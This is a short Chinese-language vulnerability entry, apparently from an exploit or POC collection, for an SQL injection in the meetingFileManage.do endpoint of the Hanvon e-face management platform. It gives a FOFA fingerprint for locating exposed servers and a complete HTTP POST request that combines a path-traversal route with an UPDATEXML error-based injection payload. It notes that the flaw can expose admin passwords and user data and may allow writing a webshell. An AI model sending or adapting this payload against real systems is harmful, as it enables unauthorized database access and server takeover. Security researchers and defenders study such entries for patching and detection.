## 汉王e脸通综合管理平台 meetingFileManage.do SQL注入漏洞

## 漏洞描述
汉王e脸通综合管理平台 meetingFileManage.do 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 网络空间测绘
```
fofa: icon_hash="1380907357"
```

## POC
```
POST /manage/intercom/../..//manage/meeting/meetingFileManage.do HTTP/1.1
Host: [你的目标主机]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: JSESSIONID=E5BD4E420E7388A3B00099284CBA8365; Path=/; HttpOnly
Content-Type: application/x-www-form-urlencoded
Content-Length: [自动计算或手动填写]

page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1)),0x71706b7671),8357))
```



## 参考
- 社区爆料

